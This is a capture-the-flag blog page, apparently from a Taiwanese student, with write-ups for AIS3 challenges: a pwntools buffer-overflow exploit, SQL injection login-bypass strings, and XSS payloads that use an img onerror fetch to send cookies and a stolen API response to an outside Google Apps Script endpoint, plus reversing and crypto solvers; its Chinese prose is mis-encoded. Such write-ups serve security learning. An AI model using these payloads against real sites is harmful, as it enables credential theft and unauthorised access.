<h3 id="exploit-code"><a href="#exploit-code" class="headerlink" title="exploit code"></a>exploit code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">io=pwn.remote(<span class="string">&quot;chals1.ais3.org&quot;</span>,<span class="number">12348</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recvuntil(<span class="string">&quot;!&quot;</span>))</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;solving..<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line">    string=io.recv().decode()</span><br><span class="line">    string=string.strip(<span class="string">&quot; &quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(string,<span class="built_in">eval</span>(string))</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(string)))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/rkpBv0QHh.png"></p>
<blockquote>
<p>AIS3{donâ€™t_eval_unknown_code_or_pipe_curl_to_sh}<br>è¢«ç½µäº†</p>
</blockquote>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Simply-Pwn"><a href="#Simply-Pwn" class="headerlink" title="Simply Pwn"></a>Simply Pwn</h2><pre><code>The simplest pwn

nc chals1.ais3.org 11111
</code></pre>
<p>ç¶“å…¸buffer overflow</p>
<h3 id="å…ˆç”¨gdbè§€å¯Ÿ"><a href="#å…ˆç”¨gdbè§€å¯Ÿ" class="headerlink" title="å…ˆç”¨gdbè§€å¯Ÿ"></a>å…ˆç”¨gdbè§€å¯Ÿ</h3><p>niåˆ°readé™„è¿‘</p>
<p><img src="https://hackmd.io/_uploads/H1wvwAmHh.png"></p>
<p>å¯ä»¥ç™¼ç¾è¼¸å…¥è®Šæ•¸å­˜åœ¨<strong>rsi&#x3D;rbp-0x50+0x9&#x3D;rbp-0x47</strong></p>
<p>æ‰€ä»¥å¿…é ˆå¢Š<strong>0x47+8byte(RSP)+address</strong>ï¼Œå‰›å¥½å¯ä»¥è¦†è“‹return address</p>
<p><img src="https://hackmd.io/_uploads/ryndPC7S2.png"></p>
<p>ç›´æ¥è®“ç¨‹å¼è·³åˆ°shellcode</p>
<h3 id="exploit-code-1"><a href="#exploit-code-1" class="headerlink" title="exploit code"></a>exploit code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line">io=pwn.remote(<span class="string">&quot;chals1.ais3.org&quot;</span>,<span class="number">11111</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x4f</span>)+pwn.p64(<span class="number">0x4017a5</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>AIS3{5imP1e_Pwn_4_beGinn3rs!}</p>
</blockquote>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Login-Panel"><a href="#Login-Panel" class="headerlink" title="Login Panel"></a>Login Panel</h2><pre><code>Login Panel ç¶²ç«™æ¡ç”¨äº†éš±å½¢ reCAPTCHA ä½œç‚ºé˜²è­·æ©Ÿåˆ¶ï¼Œä»¥ç¢ºä¿åªæœ‰äººé¡çš„ä½¿ç”¨è€…èƒ½å¤ ç™»å…¥
admin çš„å¸³è™Ÿã€‚ä½ çš„ä»»å‹™æ˜¯æ‰¾åˆ°ä¸€å€‹æ–¹æ³•ä¾†ç¹é reCAPTCHAï¼ŒæˆåŠŸç™»å…¥ admin çš„å¸³è™Ÿã€‚

ä½ å¯ä»¥ä½¿ç”¨å„ç¨®æŠ€è¡“å’Œæ‰‹æ®µä¾†é”æˆç›®æ¨™ï¼Œå¯èƒ½éœ€è¦é€²è¡Œä¸€äº›ç¶²ç«™åˆ†æã€ç¨‹å¼ç¢¼è§£è®€æˆ–å…¶ä»–å½¢å¼çš„
æ”»æ“Šã€‚è«‹æ³¨æ„ï¼Œä½ éœ€è¦éµå®ˆé“å¾·è¦ç¯„ï¼Œä¸å¾—é€²è¡Œä»»ä½•éæ³•æˆ–æœ‰å®³çš„è¡Œç‚ºã€‚

ç•¶ä½ æˆåŠŸç™»å…¥ admin çš„å¸³è™Ÿå¾Œï¼Œä½ å°‡èƒ½å¤ ç²å¾— FLAGã€‚è«‹å°‡ FLAG æäº¤è‡³æŒ‘æˆ°å¹³å°ï¼Œä»¥è­‰æ˜
ä½ çš„æˆåŠŸã€‚

Author: Ching367436

http://chals1.ais3.org:8000/
</code></pre>
<p>ç›´æ¥è®€source code</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="title function_">get</span>(<span class="string">`SELECT * FROM Users WHERE username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="subst">$&#123;password&#125;</span>&#x27;`</span></span><br></pre></td></tr></table></figure>

<p>èèµ·ä¾†å°±å¾ˆæœ‰SQL injectionçš„å‘³é“</p>
<h3 id="Bypass-Login-Page"><a href="#Bypass-Login-Page" class="headerlink" title="Bypass Login Page"></a>Bypass Login Page</h3><p>æ³¨å…¥<strong>username</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br></pre></td></tr></table></figure>
<p>ä¸­è¨ˆç›´æ¥è¢«Redirectåˆ°rickroll</p>
<p><strong>okä¸ç„¶æ”¹æ³¨password</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸé€²å…¥ä¹‹å¾Œé‚„æœ‰2faèªè­‰ï¼Œè¦è¼¸å…¥2fa codeæ‰èƒ½é€²åˆ°dashboardçœ‹flagï¼Œä½†æ˜¯ä»”ç´°çœ‹å…¶å¯¦é©—è­‰å®Œä¹‹å¾Œä»–ä¹Ÿåªæ˜¯redirectåˆ°&#x2F;dashboardè€Œå·²ï¼Œæ‰€ä»¥ç›´æ¥å­˜å–&#x2F;dashboardå³å¯</p>
<blockquote>
<p>AIS3{â€˜ UNION SELECT 1, 1, 1, 1 WHERE ({condition})â€“}</p>
</blockquote>
<h2 id="E-Portfolio-baby"><a href="#E-Portfolio-baby" class="headerlink" title="E-Portfolio baby"></a>E-Portfolio baby</h2><pre><code>AIS3 E-Portfolio æ˜¯ä¸€å€‹å­¸ç¿’æˆå°±å±•ç¤ºå¹³å°ï¼Œè®“ä½¿ç”¨è€…å¯ä»¥å»ºç«‹ä¸¦åˆ†äº«ä»–å€‘åœ¨ AIS3 çš„å­¸ç¿’æˆæœå’Œå°ˆ
æ¡ˆä½œå“ã€‚å…¶ä¸­ï¼Œç¶²ç«™æä¾›äº†ä¸€å€‹ã€ŒShare your portfolio with adminã€çš„åŠŸèƒ½ï¼Œè®“ä½¿ç”¨è€…å¯ä»¥å°‡è‡ª
å·±çš„ä½œå“é›†åˆ†äº«çµ¦ç®¡ç†å“¡ã€‚

ä½ éœ€è¦æ‰¾å‡ºä¸€å€‹å‰ç«¯æ¼æ´ï¼Œç•¶ä½ åˆ†äº«ä½œå“é›†çµ¦ç®¡ç†å“¡æ™‚ï¼Œèƒ½å¤ ç«Šå– admin çš„æ——å¹Ÿã€‚ä½ å¯ä»¥é€éæ¢ç´¢ç¶²ç«™
çš„å‰ç«¯ç¨‹å¼ç¢¼ï¼Œæ‰¾åˆ°é©ç•¶çš„æ–¹å¼ä¾†è§¸ç™¼æ¼æ´ä¸¦å–å¾—æ——å¹Ÿã€‚

è«‹æ³¨æ„ï¼Œä½ éœ€è¦åœ¨æ¼æ´è¨­è¨ˆä¸­ä¿æŒåˆæ³•ä¸¦éµå¾ªé“å¾·åŸå‰‡ã€‚è«‹å‹¿ä»¥ä»»ä½•æ–¹å¼å‚·å®³ç¶²ç«™çš„æ­£å¸¸é‹ä½œæˆ–ä½¿ç”¨è€…çš„éš±ç§ã€‚

å°äº†ï¼ŒæŒ‰ä¸‹ã€ŒShare your portfolio with adminã€çš„æŒ‰éˆ•çš„æ™‚å€™ï¼Œadmin æœƒå»æ‹œè¨ªçš„é é¢æœƒæ˜¯
http://url/share?username=&#123;æŒ‰ä¸‹é‚£å€‹æŒ‰éˆ•çš„ä½¿ç”¨è€…åç¨±&#125;ã€‚

Author: Ching367436

http://chals1.ais3.org:8880/
</code></pre>
<p>çœ‹åˆ°share to adminå°±çŸ¥é“é€™æ˜¯csrfé¡Œç›®<br>å…ˆæˆ³æˆ³çœ‹</p>
<h3 id="æ¸¬è©¦XSS"><a href="#æ¸¬è©¦XSS" class="headerlink" title="æ¸¬è©¦XSS"></a>æ¸¬è©¦XSS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>æ²’åæ‡‰ï¼Œå› ç‚ºå¯«ä¸Šæ–‡å­—æ˜¯ä½¿ç”¨innerHTMLï¼Œæ‰€ä»¥å° <strong>&lt;script&gt;</strong> æ¨™ç±¤ä¸èµ·ä½œç”¨</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (data.<span class="property">success</span>) &#123;</span><br><span class="line">                        username.<span class="property">innerHTML</span> = data.<span class="property">data</span>.<span class="property">username</span></span><br><span class="line">                        about.<span class="property">innerHTML</span> = data.<span class="property">data</span>.<span class="property">about</span></span><br><span class="line">                        avatar.<span class="property">src</span> = data.<span class="property">data</span>.<span class="property">avatar</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="title function_">alert</span>(data.<span class="property">message</span>)</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
<p>ç”¨ <strong>&lt;img src&gt;</strong> è©¦è©¦</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;123&quot; onerror=alert()&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/rkAxgsVH2.png"><br>æœç„¶å‡ºç¾XSS</p>
<h3 id="å˜—è©¦ç•¶cookieå°å·"><a href="#å˜—è©¦ç•¶cookieå°å·" class="headerlink" title="å˜—è©¦ç•¶cookieå°å·"></a>å˜—è©¦ç•¶cookieå°å·</h3><p><strong>ä¸€é–‹å§‹çš„æ€è·¯æ˜¯ç•¶cookieå°å·ï¼Œç„¶å¾Œç”¨adminç™»å…¥çœ‹flagè—åœ¨å“ª</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&#x27;&#x27; onerror=fetch(&#x27;https://script.google.com/macros/s/\</span><br><span class="line">                           AKfycbxFRZIq7zd9X5gpd9MNCIe9m6d_GwrT3kY9vkVH8hPXic7pbr-\</span><br><span class="line">                           pW0B8vTj0lureCaOdOA/exec?\</span><br><span class="line">                           text=cookie:&#x27;+encodeURI(document.cookie))&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/B1syQsNBn.png"><br>å› ç‚ºæœ‰è¨­å®šHTTP onlyæ‰€ä»¥å·ä¸åˆ°cookie(å¾Œä¾†ç™¼ç¾å·åˆ°ä¹Ÿæ²’ç”¨ï¼Œflagä¸åœ¨adminçš„é é¢è£¡é¢)</p>
<h3 id="å˜—è©¦ç›´æ¥å·apiå…§å®¹"><a href="#å˜—è©¦ç›´æ¥å·apiå…§å®¹" class="headerlink" title="å˜—è©¦ç›´æ¥å·apiå…§å®¹"></a>å˜—è©¦ç›´æ¥å·apiå…§å®¹</h3><p>çœ‹sauce codeæœƒç™¼ç¾å…¶å¯¦flagå¯«åœ¨adminçš„å¯†ç¢¼è£¡é¢ï¼Œç„¶å¾Œå¯†ç¢¼åˆé€éapi&#x2F;portfolioå‚³é<br><img src="https://hackmd.io/_uploads/ByImUsEB3.png"></p>
<p>oké–‹å·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;123&quot; onerror=&quot;fetch(&#x27;api/portfolio&#x27;)</span><br><span class="line">      .then(response =&gt;response.text()).then(text=&gt;&#123;</span><br><span class="line">        var url=</span><br><span class="line">            &#x27;https://script.google.com/macros/s/\</span><br><span class="line">            AKfycbxFRZIq7zd9X5gpd9MNCIe9m6d_GwrT3kY9vkVH8hPXic7pbr-\</span><br><span class="line">            pW0B8vTj0lureCaOdOA/exec?text=&#x27;</span><br><span class="line">        fetch(url+encodeURI(text))</span><br><span class="line">      &#125;)&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/S19GtoVrh.png"><br>åœ¨ç€è¦½å™¨ä¸Šæ¸¬è©¦æˆåŠŸï¼Œä½†share to adminç”šéº¼äº‹éƒ½æ²’ç™¼ç”Ÿ</p>
<p><img src="https://hackmd.io/_uploads/HkNT5jNrh.png"><br>ç¶²ç«™æ²’æœ‰è¨­å®šCSPï¼Œæ‰€ä»¥æ‡‰è©²æ˜¯æ©Ÿå™¨äººæ²’è¾¦æ³•è¨ªå•å¤–ç¶²</p>
<h3 id="å˜—è©¦å¯«å…¥è‡ªå·±çš„page"><a href="#å˜—è©¦å¯«å…¥è‡ªå·±çš„page" class="headerlink" title="å˜—è©¦å¯«å…¥è‡ªå·±çš„page"></a>å˜—è©¦å¯«å…¥è‡ªå·±çš„page</h3><p>æ²’è¾¦æ³•ç›´æ¥ç”¨webhookå°±è®Šå¾ˆè¤‡é›œäº†</p>
<p><strong>æ”¹è®Šçµ²è·¯:</strong><br>å·åˆ°api&#x2F;portfolio-&gt;ç™»å…¥è‡ªå·±çš„å¸³è™Ÿ-&gt;å¯«å…¥textarea-&gt;å„²å­˜</p>
<p><em><strong>å‰µå»ºç™»å…¥form</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=form action=&quot;/api/login&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;username&quot; value=&quot;test123&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;password&quot; value=&quot;test&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p><em><strong>å…ˆå·api&#x2F;portfolioå†submitè¡¨å–®åˆ‡æˆè‡ªå·±å¸³è™Ÿï¼Œæœ€å¾Œæ”¹textareaã€click save</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;123&quot; onerror=&quot;fetch(&#x27;http://web:8000/api/portfolio&#x27;)</span><br><span class="line">      .then(response =&gt;response.text()).then(text=&gt;&#123;</span><br><span class="line">        form.submit()</span><br><span class="line">        setTimeout(function() &#123;</span><br><span class="line">        console.log(&#x27;123&#x27;);</span><br><span class="line">        &#125;, 1000);    </span><br><span class="line">        var win=window.open(&#x27;http://web:8000/portfolio&#x27;)</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">        win.document.querySelector(&#x27;textarea[id=about]&#x27;).value = text;</span><br><span class="line">        win.document.querySelector(&#x27;button[id=save]&#x27;).click()</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">      &#125;)&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/HJDHTiNSn.png"></p>
<blockquote>
<p>AIS3{&lt;img src&#x3D;x onerror&#x3D;â€™fetch(â€¦}</p>
</blockquote>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Simply-Reverse"><a href="#Simply-Reverse" class="headerlink" title="Simply Reverse"></a>Simply Reverse</h2><pre><code>Just reverse it!
</code></pre>
<h3 id="å…ˆåŸ·è¡Œçœ‹çœ‹"><a href="#å…ˆåŸ·è¡Œçœ‹çœ‹" class="headerlink" title="å…ˆåŸ·è¡Œçœ‹çœ‹"></a>å…ˆåŸ·è¡Œçœ‹çœ‹</h3><p><img src="https://hackmd.io/_uploads/B10RnhEr2.png"></p>
<p><img src="https://hackmd.io/_uploads/S1kMT2NSh.png"></p>
<h3 id="ä¸Ÿghidra"><a href="#ä¸Ÿghidra" class="headerlink" title="ä¸Ÿghidra"></a>ä¸Ÿghidra</h3><p><img src="https://hackmd.io/_uploads/ryusahEB3.png"><br>é€™é‚Šæœ‰ä¸€å€‹verifyå‡½å¼åˆ¤æ–·keyæ˜¯å¦æ­£ç¢º</p>
<h3 id="è§£é¡Œçµ²è·¯"><a href="#è§£é¡Œçµ²è·¯" class="headerlink" title="è§£é¡Œçµ²è·¯"></a>è§£é¡Œçµ²è·¯</h3><pre><code>å› ç‚ºverify()çš„è¿´åœˆæ¯è·‘ä¸€åœˆå°±æœƒæª¢æŸ¥ä¸€å€‹charï¼Œä¸€ç›´åˆ°local_c=0x22 ç„¶å¾Œreturn true;
æ‰€ä»¥å¯ä»¥brute force è·‘æ¯å€‹å­—å…ƒç„¶å¾Œçœ‹è¿´åœˆæœ‰æ²’æœ‰ç‚¸æ‰
</code></pre>
<h3 id="exploit-code-2"><a href="#exploit-code-2" class="headerlink" title="exploit code"></a>exploit code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">io=pwn.process(<span class="string">&quot;gdb&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;file rev&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;b *0x5555555551fb&quot;</span>)    <span class="comment">#æŠŠbreakpoint è¨­åœ¨è¿´åœˆè£é¢ï¼Œå¦‚æœæ²’æœ‰åœä»£è¡¨æ˜¯éŒ¯çš„</span></span><br><span class="line">io.recvrepeat(timeout=<span class="number">1</span>)</span><br><span class="line">flag=<span class="string">&quot;AIS3&#123;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7E</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;trying..&quot;</span>,flag+<span class="built_in">chr</span>(i))</span><br><span class="line">        io.sendline(<span class="string">f&quot;set args <span class="subst">&#123;flag+<span class="built_in">chr</span>(i)&#125;</span>&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;run&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)+<span class="number">1</span>):</span><br><span class="line">            io.sendline(<span class="string">&quot;c&quot;</span>)</span><br><span class="line">        io.recvrepeat(timeout=<span class="number">0.3</span>).decode()</span><br><span class="line">        io.sendline(<span class="string">&quot;x/x $rbp-0x4&quot;</span>)</span><br><span class="line">        string=io.recv().decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;No&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> string:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<blockquote>
<p>AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}</p>
</blockquote>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Fernet"><a href="#Fernet" class="headerlink" title="Fernet"></a>Fernet</h2><pre><code>ä½ æ‰€åœ¨çš„å…¬å¸æœ€è¿‘ç™¼ç”Ÿäº†ä¸€èµ·é§­å®¢å…¥ä¾µäº‹ä»¶ï¼Œç®¡ç†å“¡ç™¼ç¾é§­å®¢ä½¿ç”¨ Fernet å¯†ç¢¼å­¸ä¾†åŠ å¯†äº†ä»–å€‘çš„æ•æ„Ÿæ•¸æ“šã€‚
ä½ éœ€è¦è§£é–‹è¢«åŠ å¯†çš„æª”æ¡ˆï¼Œå¦å‰‡äº‹æƒ…å°±å¤§æ¢äº†ï¼

flag format : FLAG&#123;xxx&#125;

Auther : Richard ( dogxxx)
</code></pre>
<h3 id="çœ‹code"><a href="#çœ‹code" class="headerlink" title="çœ‹code"></a>çœ‹code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext, password</span>):</span><br><span class="line">    salt = os.urandom(<span class="number">16</span>)  </span><br><span class="line">    key = PBKDF2(password.encode(), salt, <span class="number">32</span>, count=<span class="number">1000</span>, hmac_hash_module=SHA256)  </span><br><span class="line">    f = Fernet(base64.urlsafe_b64encode(key))  </span><br><span class="line">    ciphertext = f.encrypt(plaintext.encode())  </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(salt + ciphertext).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage:</span></span><br><span class="line">leak_password = <span class="string">&#x27;mysecretpassword&#x27;</span></span><br><span class="line">plaintext = FLAG</span><br><span class="line"></span><br><span class="line"><span class="comment"># Encrypt</span></span><br><span class="line">ciphertext = encrypt(plaintext, leak_password)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encrypted data:&quot;</span>,ciphertext)</span><br></pre></td></tr></table></figure>
<h3 id="çµ²è·¯"><a href="#çµ²è·¯" class="headerlink" title="çµ²è·¯"></a>çµ²è·¯</h3><pre><code>å¯†ç¢¼éƒ½çµ¦ä½ äº†æ‰€ä»¥åè‘—è§£å¯†å°±å¥½äº†
</code></pre>
<p>åŠ å¯†æµç¨‹æ˜¯:ç”¢ç”Ÿsalt-&gt;ç”¢ç”Ÿkey-&gt;ç”¨keyåŠ å¯†flag-&gt;æŠŠsalt+ciphertextç”¨base64 encodeèµ·ä¾†<br>æ‰€ä»¥å…¶å¯¦saltä¹Ÿçµ¦ä½ äº†å°±æ˜¯base64 decodeå¾Œçš„å‰16å€‹char</p>
<h3 id="decrypt-code"><a href="#decrypt-code" class="headerlink" title="decrypt code"></a>decrypt code</h3><p>è§£å¯†æµç¨‹:base64 decode-&gt;å–å¾—saltã€ciphertext-&gt;ç”¨passwordã€salté‡å»ºkey-&gt;ç”¨keyè§£å¯†ciphertext</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line">cipher=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlO</span></span><br><span class="line"><span class="string">aC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1Ja</span></span><br><span class="line"><span class="string">OGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cipher=cipher.encode()</span><br><span class="line">cipher=base64.b64decode(cipher)</span><br><span class="line">salt=cipher[:<span class="number">16</span>]</span><br><span class="line">cipher=cipher[<span class="number">16</span>:]</span><br><span class="line"><span class="built_in">print</span>(salt)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line">leak_password = <span class="string">&#x27;mysecretpassword&#x27;</span></span><br><span class="line">key = PBKDF2(leak_password.encode(), salt, <span class="number">32</span>, count=<span class="number">1000</span>, hmac_hash_module=SHA256)  </span><br><span class="line">f = Fernet(base64.urlsafe_b64encode(key))  </span><br><span class="line">plaintext=f.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG{W3lc0m3_t0_th3_CTF_W0rld_!!<em>!!!</em>!}</p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-02-06T13:09:56.000Z" title="2024/2/6 ä¸‹åˆ9:09:56">2024-02-06</time>ç™¼è¡¨</span><span class="level-item"><time dateTime="2024-08-28T05:12:33.843Z" title="2024/8/28 ä¸‹åˆ1:12:33">2024-08-28</time>æ›´æ–°</span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a><span>Â /Â </span><a class="link-muted" href="/categories/CTF/Writeup/">Writeup</a></span><span class="level-item">4 åˆ†é˜è®€å®Œ (å¤§ç´„559å€‹å­—)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/02/06/2024-AIS3-EOF-CTF-Qual-writeup/">2024 AIS3 EOF CTF Qual writeup</a></p><div class="content"><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="nslookup-final"><a href="#nslookup-final" class="headerlink" title="nslookup final"></a>nslookup final</h3><p>æœ‰command injectionï¼Œç”¨&#96;&#96;æŠŠæŒ‡ä»¤åŒ…èµ·ä¾†ï¼Œä½†æ˜¯æœƒæœ‰ä¸€å€‹å•é¡Œå°±æ˜¯ä»–ä¸æœƒå›å‚³çµæœï¼Œ</p>
